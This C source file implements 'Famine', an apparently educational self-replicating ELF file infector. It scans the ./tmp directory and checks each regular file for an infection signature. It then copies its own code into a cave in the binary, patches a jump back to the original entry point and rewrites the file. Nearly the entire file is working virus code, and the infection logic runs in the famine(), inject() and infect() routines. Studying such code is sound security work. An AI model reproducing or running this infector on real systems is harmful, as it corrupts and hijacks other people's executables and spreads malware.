#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include "famine.h"
#include <elf.h>
#include <sys/syscall.h>
#include "map.h"
#include "utils.h"
//#include "silvio.h"
#include "bss.h"

#include <sys/types.h>
#ifndef NULL
#define NULL ((void *)0)
#endif

extern void end();
void famine(void);

#define JMP_OFFSET 0x6
#define JMP_SIZE 4

void	__attribute__((naked)) _start(void)
{
	__asm__ ("call famine\n"
			 "jmp end\n");
			//"signature:\n"
			//".ascii \"Famine coded by Francis\\n\\0\"\n");
}


static int	patch_new_file(t_data *data, const char *filename) {

	_syscall(SYS_unlink, filename);

	int fd = _syscall(SYS_open, filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
	if (fd == -1)
		return 1;

	if (_syscall(SYS_write, fd, data->file, data->size) == -1) {
		_syscall(SYS_close, fd);
		return 1;
	}

	_syscall(SYS_close, fd);

	return 0;
}


static int	calculate_jmp(t_data *data) {

		data->cave.rel_jmp =  \
		(int64_t)data->cave.old_entry -  \
		(int64_t)(data->cave.addr + JMP_OFFSET + JMP_SIZE);

	return 0;
}

static int	inject(t_data *data) {
	
	unsigned long size = (unsigned long)&end - (unsigned long)&_start;

	if (bss(data, size) == 1) {
		return 1;
	}

	calculate_jmp(data);

	ft_memcpy(data->file + data->cave.offset, &_start, size);

	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, &data->cave.rel_jmp, JMP_SIZE);

	return 0;
}

static int search_signature(t_data *data, const char *key) {
    if (!data || !data->file || !key) {
        return -1;
    }

    size_t key_len = ft_strlen(key);
    if (key_len == 0 || key_len > data->size) {
        return -1;
    }

    void *found = ft_memmem(data->file, data->size, key, key_len);
    return (found != NULL) ? 1 : 0;
}

static int	already_patched(t_data data)
{
	char signature[] = "Famine (c)oded by Francis\n";
	//char signature[] = "\x46\x61\x6d\x69\x6e\x65\x20\x63\x6f\x64\x65\x64\x20\x62\x79"
	//	"\x20\x46\x72\x61\x6e\x63\x69\x73\x0a\x00";
	return search_signature(&data, signature) == 1;
}

static int	infect(const char *filename)
{

	t_data data;
	ft_memset(&data, 0, sizeof(t_data));

	data.payload_size = (unsigned long)&end - (unsigned long)&_start;

	if (map_file(filename, &data) != 0) {
		return 1;
	}

	updade_hdr(&data);

	if (already_patched(data) != 0) {
		free_data(&data);
		return 1;
	}

	if (inject(&data) != 0) {
		free_data(&data);
		return 1;
	}

	if (patch_new_file(&data, filename) != 0) {
		free_data(&data);
		return 1;
	}

	//_syscall(SYS_msync, data.file, data.size, MS_SYNC);
	free_data(&data);

	return 0;
}

static void	open_file(char *file)
{
	struct linux_dirent64 {
		unsigned long d_ino;
		unsigned long d_off;
		unsigned short d_reclen;
		unsigned char d_type;
		char d_name[];
	};

	int fd = _syscall(SYS_open, file, O_RDONLY);
	if (fd < 0)
		return ;

	char buf[PATH_MAX];
	struct linux_dirent64 *dir;
	ssize_t ret;

	for(;;)
	{
		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
		if (ret <= 0)
			break;
		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
		{
			dir = (struct linux_dirent64 *)(buf + i);

			if (dir->d_name[0] == '.'
				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
				continue;
			
			if (dir->d_type == DT_REG) {

				char new_path[PATH_MAX];

				make_path(new_path, file, dir->d_name);

				infect(new_path);
			}
		}
	}

	_syscall(SYS_close, fd);

}

void	famine(void)
{
	char p1[] = "./tmp";
	char *paths[] = {
		p1,
		(void *)0,
	};

	for (int i = 0; paths[i]; i++)
		open_file(paths[i]);

}
